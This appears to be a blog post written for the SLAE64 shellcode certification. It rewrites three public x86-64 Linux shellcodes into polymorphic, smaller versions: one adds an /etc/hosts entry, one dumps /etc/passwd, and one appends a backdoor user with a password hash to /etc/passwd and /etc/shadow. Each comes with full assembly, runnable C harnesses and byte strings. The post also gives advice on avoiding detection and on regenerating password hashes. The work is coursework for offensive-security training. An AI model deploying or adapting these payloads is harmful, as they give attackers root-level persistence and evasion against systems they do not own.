Assignment #6 – Writing polymorphic shellcodes
==============================================

In this assignment I had to choose three shellcodes from [Shell Storm][shell_storm_shellcode] and write polymorphic versions of them. Bonus points if your version is smaller than the original. I chose the following:

- Linux/x86-64 - Add map in /etc/hosts file - 110 bytes by Osanda Malith Jayathissa
- Linux/x86-64 - Read /etc/passwd - 82 bytes by Mr.Un1k0d3r
- Linux/x86-64 - Add user and password with echo cmd - 273 bytes by Christophe G

Add map in `/etc/hosts` file - 110 bytes by [@OsandaMalith][@OsandaMalith]
--------------------------------------------------------------------------

The original shellcode can be found [here][shell_storm_shellcode_896]. It is reproduced below.

Doing a quick reverse we find this shellcode adds an entry to `/etc/hosts`, in this case `127.1.1.1 google.lk`.

    ; Title: Add map in /etc/hosts file - 110 bytes
    ; Date: 2014-10-29
    ; Platform: linux/x86_64
    ; Website: http://osandamalith.wordpress.com
    ; Author: Osanda Malith Jayathissa (@OsandaMalith)

    global _start
        section .text

    _start:
        ;open
        xor rax, rax 
        add rax, 2  ; open syscall
        xor rdi, rdi
        xor rsi, rsi
        push rsi ; 0x00 
        mov r8, 0x2f2f2f2f6374652f ; stsoh/
        mov r10, 0x7374736f682f2f2f ; /cte/
        push r10
        push r8
        add rdi, rsp
        xor rsi, rsi
        add si, 0x401
        syscall

        ;write
        xchg rax, rdi
        xor rax, rax
        add rax, 1 ; syscall for write
        jmp data

    write:
        pop rsi 
        mov dl, 19 ; length in rdx
        syscall

        ;close
        xor rax, rax
        add rax, 3
        syscall

        ;exit
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall 

    data:
        call write
        text db '127.1.1.1 google.lk'

My polymorphic version can be seen below. The first part was heavily altered and multiple size optimisations were introduced. The remaining parts had some instructions substituted by equivalent ones and some more optimisations (say `xor eax, eax` instead of `xor rax, rax`). In the end my polymorphic version works as the original but was cut from 110 bytes to 85. Neither the original nor my version include null bytes.

    global _start
        section .text

    _start:
        ;open
        ; rdi = *pathname
        ; rsi = 0x0401
        ; rax = 2
        push 2
        pop rax
        xor edi, edi
        push rdi                     ; null byte, terminate string
        push 0x7374736f              ; rax2 -S $(echo osts | rev)
        mov r9, 0x682f6374652f2f2f   ; rax2 -S $(echo ///etc/h | rev)
        push r9
        mov rdi, rsp
        push word 0x0401             ; O_WRONLY|O_APPEND
        pop si
        syscall

        ;write
        mov edi, eax
        xor eax, eax
        inc rax                      ; syscall for write
        jmp data

    write:
        pop rsi
        mov dl, 19                   ; length in rdx
        syscall

        ;close
        sub eax, eax
        add eax, 3
        syscall

        ;exit
        ;xor eax, eax                ; already done by close
        add al, 60
        xor edi, edi
        syscall

    data:
        call write
        text db '127.1.1.1 google.lk'


    #include <stdio.h>
    #include <string.h>

    char code[] =
    "\x6a\x02\x58\x31\xff\x57\x68\x6f\x73\x74\x73\x49\xb9\x2f\x2f\x2f\x65\x74"
    "\x63\x2f\x68\x41\x51\x48\x89\xe7\x66\x68\x01\x04\x66\x5e\x0f\x05\x89\xc7"
    "\x31\xc0\x48\xff\xc0\xeb\x12\x5e\xb2\x13\x0f\x05\x29\xc0\x83\xc0\x03\x0f"
    "\x05\x04\x3c\x31\xff\x0f\x05\xe8\xe9\xff\xff\xff\x31\x32\x37\x2e\x31\x2e"
    "\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x6c\x6b";

    int main() {
        printf("length: %lu\n", strlen(code));
        ((int(*)()) code)();
    }

Diff:

    $ diff <(nasm -E shellcode-896_add-map-in-etc-hosts.nasm) <(nasm -E shellcode-896_add-map-in-etc-hosts_polymorph.nasm) | grep -v "^[<>] $"

    1,7c1
    < %line 1+1 shellcode-896_add-map-in-etc-hosts.nasm
    ---
    > %line 1+1 shellcode-896_add-map-in-etc-hosts_polymorph.nasm
    13,24c7,19
    <  xor rax, rax
    <  add rax, 2
    <  xor rdi, rdi
    <  xor rsi, rsi
    <  push rsi
    <  mov r8, 0x2f2f2f2f6374652f
    <  mov r10, 0x7374736f682f2f2f
    <  push r10
    <  push r8
    <  add rdi, rsp
    <  xor rsi, rsi
    <  add si, 0x401
    ---
    >  push 2
    >  pop rax
    >  xor edi, edi
    >  push rdi
    >  push 0x7374736f
    >  mov r9, 0x682f6374652f2f2f
    >  push r9
    >  mov rdi, rsp
    >  push word 0x0401
    >  pop si
    28,30c23,25
    <  xchg rax, rdi
    <  xor rax, rax
    <  add rax, 1
    ---
    >  mov edi, eax
    >  xor eax, eax
    >  inc rax
    39,40c34,35
    <  xor rax, rax
    <  add rax, 3
    ---
    >  sub eax, eax
    >  add eax, 3
    44,46c39,41
    <  xor rax, rax
    <  mov al, 60
    <  xor rdi, rdi
    ---
    >  add al, 60
    >  xor edi, edi


Read `/etc/passwd` - 82 bytes by Mr.Un1k0d3r
--------------------------------------------

The original shellcode can be found [here][shell_storm_shellcode_878]. It is reproduced below. It simply opens `/etc/passwd`, reads its contents and writes them to stdout. The shellcode has no null bytes.

    BITS 64
    ; Author Mr.Un1k0d3r - RingZer0 Team
    ; Read /etc/passwd Linux x86_64 Shellcode
    ; Shellcode size 82 bytes
    global _start

    section .text

    _start:
    jmp _push_filename

    _readfile:
    ; syscall open file
    pop rdi ; pop path value
    ; NULL byte fix
    xor byte [rdi + 11], 0x41

    xor rax, rax
    add al, 2
    xor rsi, rsi ; set O_RDONLY flag
    syscall

    ; syscall read file
    sub sp, 0xfff
    lea rsi, [rsp]
    mov rdi, rax
    xor rdx, rdx
    mov dx, 0xfff; size to read
    xor rax, rax
    syscall

    ; syscall write to stdout
    xor rdi, rdi
    add dil, 1 ; set stdout fd = 1
    mov rdx, rax
    xor rax, rax
    add al, 1
    syscall

    ; syscall exit
    xor rax, rax
    add al, 60
    syscall

    _push_filename:
    call _readfile
    path: db "/etc/passwdA"

My polymorphic version is below. Other than equivalent (sometimes shorter) instructions substitutions the `read` part was a bit reworked to shorten it a bit. Also, the terminating character of the file path was replaced. The polymorphic version does not have null bytes either. The original shellcode is 82 bytes long, while the polymorphic version is 71.

    global _start
    section .text

    _start:
        jmp _push_filename

    _readfile:
        ; open
        pop rdi                     ; pop path value
        xor byte [rdi + 11], 0x5a   ; add null byte to string

        xor eax, eax
        xor esi, esi                ; set O_RDONLY flag
        mov al, 2                   ; __NR_open = 2
        syscall

        ; read
        xor edx, edx
        mov dx, 0xffe               ; size to read
        sub rsp, rdx
        mov rsi, rsp
        mov rdi, rax
        sub eax, eax                ; __NR_read = 0
        syscall

        ; write
        xor edi, edi
        inc dil                     ; stdout fd = 1
        mov rdx, rax
        xor eax, eax
        inc al                      ; __NR_write = 1
        syscall

        ; exit
        sub eax, eax
        mov al, 60
        syscall

    _push_filename:
        call _readfile
        path: db "/etc/passwdZ"


    #include <stdio.h>
    #include <string.h>

    char code[] =
    "\xeb\x34\x5f\x80\x77\x0b\x5a\x31\xc0\x31\xf6\xb0\x02\x0f\x05\x31\xd2\x66"
    "\xba\xfe\x0f\x48\x29\xd4\x48\x89\xe6\x48\x89\xc7\x29\xc0\x0f\x05\x31\xff"
    "\x40\xfe\xc7\x48\x89\xc2\x31\xc0\xfe\xc0\x0f\x05\x29\xc0\xb0\x3c\x0f\x05"
    "\xe8\xc7\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x5a";

    int main() {
        printf("length: %lu\n", strlen(code));
        ((int(*)()) code)();
    }

Diff:

    $ diff <(nasm -E shellcode-878_read-etc-passwd.nasm) <(nasm -E shellcode-878_read-etc-passwd_polymorph.nasm) | grep -v "^[<>] $"

    1,5c1
    < %line 1+1 shellcode-878_read-etc-passwd.nasm
    < [bits 64]
    ---
    > %line 1+1 shellcode-878_read-etc-passwd_polymorph.nasm
    15a12
    > xor byte [rdi + 11], 0x5a
    17,21c14,16
    < xor byte [rdi + 11], 0x41
    < xor rax, rax
    < add al, 2
    < xor rsi, rsi
    ---
    > xor eax, eax
    > xor esi, esi
    > mov al, 2
    25,26c20,23
    < sub sp, 0xfff
    < lea rsi, [rsp]
    ---
    > xor edx, edx
    > mov dx, 0xffe
    > sub rsp, rdx
    > mov rsi, rsp
    28,30c25
    < xor rdx, rdx
    < mov dx, 0xfff
    < xor rax, rax
    ---
    > sub eax, eax
    34,35c29,30
    < xor rdi, rdi
    < add dil, 1
    ---
    > xor edi, edi
    > inc dil
    37,38c32,33
    < xor rax, rax
    < add al, 1
    ---
    > xor eax, eax
    > inc al
    42,43c37,38
    < xor rax, rax
    < add al, 60
    ---
    > sub eax, eax
    > mov al, 60
    48c43
    < path: db "/etc/passwdA"
    ---
    > path: db "/etc/passwdZ"


Add user and password with echo cmd - 273 bytes by Christophe G
---------------------------------------------------------------

The original shellcode can be found [here][shell_storm_shellcode_879]. It is reproduced below. It uses `execve` to execute `/bin/sh -c echo ...` to add a new line to both `/etc/passwd` and `/etc/shadow`. The line added to `passwd` just has a reference to a new user, while on `shadow` a hash is added corresponding to the password of the added user. The number of instructions is short, most of the size comes from the string with the commands.

    ; shellcode name add_user_password
    ; Author    : Christophe G SLAE64-1337
    ; Len       : 273 bytes
    ; Language  : Nasm
    ; "name = pwned ; pass = $pass$"
    ; add user and password with echo cmd
    ; tested kali linux , kernel 3.12

    global _start
    _start:
            jmp short findaddress

    _realstart:
            pop rdi
            xor byte [rdi + 7] , 0x41 ; replace A to null byte "/bin/shA"
            xor byte [rdi + 10]  ,0x41 ; same "-cA"
            xor rdx , rdx
            lea rdi , [rdi]
            lea r9 , [rdi + 8]
            lea r10 , [rdi + 11]
            push rdx
            push r10
            push r9
            push rdi
            mov rsi , rsp
            add al , 59
            syscall

    findaddress:
            call _realstart
            string : db "/bin/shA-cAecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ; echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: >> /etc/shadow"

My polymorphic version is below. In the string I substituted A with Z. Then I changed the way in which Z was xored out of the string, including substituting R8 and R10 for ones that result in shorter opcodes. Finally I removed uneeded spaces from the command string, namely around `>>` and `;`. I opted to leave the user, IDs and hash unaltered, but if you actually use this shellcode and want to avoid detection it should be a good idea to change that. I added a comment on how to change the password. The original shellcode was 273 bytes long, while the polymorphic one is 266. Should you need to further reduce size, my bet would be to change the hashing algorithm of the password to MD5 (`-1`) or crypt (`-crypt`), which result in much shorter hashes (with the downside that the hash becomes much easier to crack).

    global _start
    _start:
        jmp short findaddress

    _realstart:
        pop rdi
        push 0x5a
        pop rax
        lea rbx, [rdi + 8]
        lea rcx, [rdi + 11]
        xor byte [rbx-1], al     ; replace Z with null byte in "/bin/shZ"
        xor byte [rcx-1], al     ; same for "-cZ"

        cdq
        push rdx                 ; NULL
        push rcx                 ; command
        push rbx                 ; "-c"
        push rdi                 ; "/bin/sh"
        push rsp
        pop rsi
        mov al, 59               ; __NR_execve
        syscall

    findaddress:
        call _realstart
        string : db "/bin/shZ-cZecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash>>/etc/passwd;echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::>>/etc/shadow"
        ; you can generate new hashes with:
        ; echo '$pass$' | openssl passwd -stdin -6 | sed -e 's/\$/\\$/g'


    #include <stdio.h>
    #include <string.h>

    char code[] =
    "\xeb\x1d\x5f\x6a\x5a\x58\x48\x8d\x5f\x08\x48\x8d\x4f\x0b\x30\x43\xff\x30"
    "\x41\xff\x99\x52\x51\x53\x57\x54\x5e\xb0\x3b\x0f\x05\xe8\xde\xff\xff\xff"
    "\x2f\x62\x69\x6e\x2f\x73\x68\x5a\x2d\x63\x5a\x65\x63\x68\x6f\x20\x70\x77"
    "\x6e\x65\x64\x3a\x78\x3a\x31\x30\x30\x31\x3a\x31\x30\x30\x32\x3a\x70\x77"
    "\x6e\x65\x64\x2c\x2c\x2c\x3a\x2f\x68\x6f\x6d\x65\x2f\x70\x77\x6e\x65\x64"
    "\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x3e\x3e\x2f\x65\x74\x63\x2f\x70"
    "\x61\x73\x73\x77\x64\x3b\x65\x63\x68\x6f\x20\x70\x77\x6e\x65\x64\x3a\x5c"
    "\x24\x36\x5c\x24\x75\x69\x48\x37\x78\x2e\x76\x68\x69\x76\x44\x37\x4c\x4c"
    "\x58\x59\x5c\x24\x37\x73\x4b\x31\x4c\x31\x4b\x57\x2e\x43\x68\x71\x57\x51"
    "\x5a\x6f\x77\x33\x65\x73\x76\x70\x62\x57\x56\x58\x79\x52\x36\x4c\x41\x34"
    "\x33\x31\x74\x4f\x4c\x68\x4d\x6f\x52\x4b\x6a\x50\x65\x72\x6b\x47\x62\x78"
    "\x52\x51\x78\x64\x49\x4a\x4f\x32\x49\x61\x6d\x6f\x79\x6c\x37\x79\x61\x56"
    "\x4b\x55\x56\x6c\x51\x38\x44\x4d\x6b\x33\x67\x63\x48\x4c\x4f\x4f\x66\x2f"
    "\x3a\x31\x36\x32\x36\x31\x3a\x30\x3a\x39\x39\x39\x39\x39\x3a\x37\x3a\x3a"
    "\x3a\x3e\x3e\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77";

    int main() {
        printf("length: %lu\n", strlen(code));
        ((int(*)()) code)();
    }

Diff:

    $ diff <(nasm -E shellcode-879_add-user-and-password-with-echo.nasm) <(nasm -E shellcode-879_add-user-and-password-with-echo_polymorph.nasm) | grep -v "^[<>] $"  | yank

    1,11c1
    < %line 1+1 shellcode-879_add-user-and-password-with-echo.nasm
    ---
    > %line 1+1 shellcode-879_add-user-and-password-with-echo_polymorph.nasm
    19,24c9,16
    <  xor byte [rdi + 7] , 0x41
    <  xor byte [rdi + 10] ,0x41
    <  xor rdx , rdx
    <  lea rdi , [rdi]
    <  lea r9 , [rdi + 8]
    <  lea r10 , [rdi + 11]
    ---
    >  push 0x5a
    >  pop rax
    >  lea rbx, [rdi + 8]
    >  lea rcx, [rdi + 11]
    >  xor byte [rbx-1], al
    >  xor byte [rcx-1], al
    >  cdq
    26,27c18,19
    <  push r10
    <  push r9
    ---
    >  push rcx
    >  push rbx
    29,30c21,23
    <  mov rsi , rsp
    <  add al , 59
    ---
    >  push rsp
    >  pop rsi
    >  mov al, 59
    33d25
    36c28,30
    <  string : db "/bin/shA-cAecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ; echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: >> /etc/shadow"
    ---
    >  string : db "/bin/shZ-cZecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash>>/etc/passwd;echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::>>/etc/shadow"

And that's all for this one.


[shell_storm_shellcode]: http://shell-storm.org/shellcode/
[shell_storm_shellcode_896]: http://shell-storm.org/shellcode/files/shellcode-896.php
[shell_storm_shellcode_878]: http://shell-storm.org/shellcode/files/shellcode-878.php
[shell_storm_shellcode_879]: http://shell-storm.org/shellcode/files/shellcode-879.php
[@OsandaMalith]: https://twitter.com/OsandaMalith

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
